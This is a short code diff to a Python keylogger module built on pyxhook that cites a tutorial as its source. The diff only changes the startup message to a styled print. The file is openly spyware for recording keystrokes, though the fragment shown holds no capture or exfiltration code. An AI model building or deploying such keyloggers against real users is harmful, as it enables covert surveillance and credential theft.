@@ -1,9 +1,10 @@
 # Source used: https://www.geeksforgeeks.org/design-a-keylogger-in-python/
 import os
 import pyxhook
+from rich import print as rprint
 
 def run(**args):
-    print("[*] starting keylogger.")
+    rprint("[ :warning: ] starting keylogger.")
     
     log_file = os.environ.get(
         'pylogger_file',
